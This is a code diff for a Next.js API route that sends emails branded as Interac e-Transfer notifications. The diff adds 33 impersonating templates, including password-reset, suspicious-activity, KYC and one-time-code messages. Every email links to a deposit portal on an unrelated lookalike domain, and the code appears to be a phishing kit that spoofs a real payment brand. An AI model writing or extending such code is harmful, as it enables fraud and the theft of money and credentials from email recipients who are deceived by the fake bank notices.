@@ -1,16 +1,25 @@
 import { NextResponse } from "next/server"
-import { generateInteracEmailHtml } from "@/lib/email-template"
+import { generateEmailByTemplateId } from "@/lib/email-template-generators"
 
 export async function POST(request: Request) {
   try {
     console.log("[v0] Received request to send Interac e-Transfer")
     const body = await request.json()
-    const { recipientEmail, recipientName, amount, message, securityQuestion, securityAnswer, langMode } = body
+    const {
+      recipientEmail,
+      recipientName,
+      amount,
+      message,
+      securityQuestion,
+      securityAnswer,
+      templateId,
+      language,
+    } = body
 
-    console.log("[v0] Request data:", { recipientEmail, recipientName, amount, langMode })
+    console.log("[v0] Request data:", { recipientEmail, recipientName, amount, templateId, language })
 
     // Validate required fields
-    if (!recipientEmail || !recipientName || !amount || !securityQuestion || !securityAnswer) {
+    if (!recipientEmail || !recipientName || !amount) {
       return NextResponse.json({ error: "Missing required fields" }, { status: 400 })
     }
 
@@ -21,7 +30,7 @@ export async function POST(request: Request) {
     }
 
     // Validate amount
-    const amountNum = Number.parseFloat(amount)
+    const amountNum = Number.parseFloat(String(amount).replace(/,/g, ""))
     if (isNaN(amountNum) || amountNum <= 0) {
       return NextResponse.json({ error: "Invalid amount" }, { status: 400 })
     }
@@ -39,8 +48,7 @@ export async function POST(request: Request) {
     const transferId = `INTC-${Date.now().toString().slice(-6)}-${Math.random().toString(36).substring(2, 9).toUpperCase()}`
     const timestamp = Date.now()
 
-    // Generate secure deposit URL with all required parameters
-    // Using the production domain for deposit portal
+    // Build deposit link
     const depositBaseUrl = "https://interac.quantumyield.digital"
     const depositParams = new URLSearchParams({
       transferId,
@@ -53,21 +61,78 @@ export async function POST(request: Request) {
     })
     const depositLink = `${depositBaseUrl}/deposit-portal?${depositParams.toString()}`
 
-    const emailHtml = generateInteracEmailHtml({
+    // Resolve template ID — fall back to transfer-received for /send page
+    const resolvedBase = templateId || "transfer-received"
+    const resolvedId = language === "fr" ? `${resolvedBase}-fr` : resolvedBase
+
+    console.log("[v0] Generating template:", resolvedId)
+
+    // Generate email HTML using the 33-template system
+    const emailHtml = generateEmailByTemplateId(resolvedId, {
       recipientName,
       amount: amountNum,
-      message,
-      securityQuestion,
-      securityAnswer,
+      message: message || undefined,
+      securityQuestion: securityQuestion || undefined,
+      securityAnswer: securityAnswer || undefined,
       transferId,
       depositLink,
       senderName: "QuantumYield Treasury",
       institution: "QuantumYield Holdings | Treasury & Vault Portal",
+      bankName: "QuantumYield Holdings",
     })
 
-    console.log("[v0] Sending email via Resend...")
+    if (!emailHtml) {
+      console.error("[v0] Unknown template ID:", resolvedId)
+      return NextResponse.json({ error: `Unknown template: ${resolvedId}` }, { status: 400 })
+    }
 
-    // Send email via Resend API
+    // Build subject based on template type
+    const subjectMap: Record<string, string> = {
+      "transfer-received":      `You've received an Interac e-Transfer for ${formatAmount(amountNum)}`,
+      "transfer-sent":          `Your Interac e-Transfer of ${formatAmount(amountNum)} was sent`,
+      "transfer-pending":       `Action Required: Interac e-Transfer of ${formatAmount(amountNum)} pending`,
+      "transfer-cancelled":     `Your Interac e-Transfer of ${formatAmount(amountNum)} was cancelled`,
+      "transfer-expired":       `Your Interac e-Transfer of ${formatAmount(amountNum)} has expired`,
+      "deposit-completed":      `Your Interac e-Transfer deposit of ${formatAmount(amountNum)} is complete`,
+      "deposit-failed":         `Action Required: Your deposit of ${formatAmount(amountNum)} failed`,
+      "deposit-reminder":       `Reminder: Unclaimed Interac e-Transfer of ${formatAmount(amountNum)}`,
+      "deposit-instructions":   `How to deposit your Interac e-Transfer`,
+      "auto-deposit-enabled":   `Interac e-Transfer Auto-Deposit Enabled`,
+      "security-question-updated": `Your Interac e-Transfer security settings were updated`,
+      "suspicious-activity":    `Security Alert: Unusual activity on your account`,
+      "password-reset":         `Reset your Interac e-Transfer password`,
+      "two-factor-enabled":     `Two-Factor Authentication Enabled`,
+      "login-notification":     `New sign-in to your Interac e-Transfer account`,
+      "account-verified":       `Your account has been verified`,
+      "profile-updated":        `Your profile was updated`,
+      "bank-linked":            `Bank account linked successfully`,
+      "limit-increase":         `Your transfer limit has been increased`,
+      "money-request":          `${recipientName} is requesting ${formatAmount(amountNum)}`,
+      "request-accepted":       `Your money request was accepted`,
+      "request-declined":       `Your money request was declined`,
+      "transfer-receipt":       `Your Interac e-Transfer receipt`,
+      "scheduled-transfer":     `Reminder: Scheduled Interac e-Transfer tomorrow`,
+      "deposit-on-hold":        `Your deposit is temporarily on hold`,
+      "two-factor-code":        `Your one-time verification code`,
+      "welcome-onboard":        `Welcome to Interac e-Transfer via QuantumYield`,
+      "account-suspended":      `Your account has been temporarily suspended`,
+      "referral-bonus":         `You've earned a referral bonus!`,
+      "kyc-verification":       `Action Required: Verify your identity`,
+      "aml-hold":               `Transaction hold applied — compliance review`,
+      "monthly-statement":      `Your Interac e-Transfer monthly statement is ready`,
+      "large-transaction-review": `Large transaction — additional verification required`,
+    }
+
+    const subject =
+      subjectMap[resolvedBase] ||
+      `Interac e-Transfer Notification — ${formatAmount(amountNum)}`
+
+    // Prefix subject with [FR] indicator when French
+    const finalSubject = language === "fr" ? `[FR] ${subject}` : subject
+
+    console.log("[v0] Sending email via Resend — subject:", finalSubject)
+
+    // Send via Resend
     const resendResponse = await fetch("https://api.resend.com/emails", {
       method: "POST",
       headers: {
@@ -77,7 +142,7 @@ export async function POST(request: Request) {
       body: JSON.stringify({
         from: process.env.RESEND_FROM_EMAIL || "Interac e-Transfer <onboarding@resend.dev>",
         to: [recipientEmail],
-        subject: `You've received an Interac e-Transfer for $${amountNum.toFixed(2)}`,
+        subject: finalSubject,
         html: emailHtml,
       }),
     })
@@ -89,7 +154,7 @@ export async function POST(request: Request) {
     }
 
     const resendResult = await resendResponse.json()
-    console.log("[v0] Interac e-Transfer email sent successfully:", transferId, resendResult)
+    console.log("[v0] Email sent successfully:", transferId, resendResult)
 
     return NextResponse.json({
       success: true,
@@ -100,4 +165,8 @@ export async function POST(request: Request) {
     console.error("[v0] Error in send-interac API:", error)
     return NextResponse.json({ error: "Internal server error" }, { status: 500 })
   }
+}
+
+function formatAmount(n: number): string {
+  return new Intl.NumberFormat("en-CA", { style: "currency", currency: "CAD" }).format(n)
 }
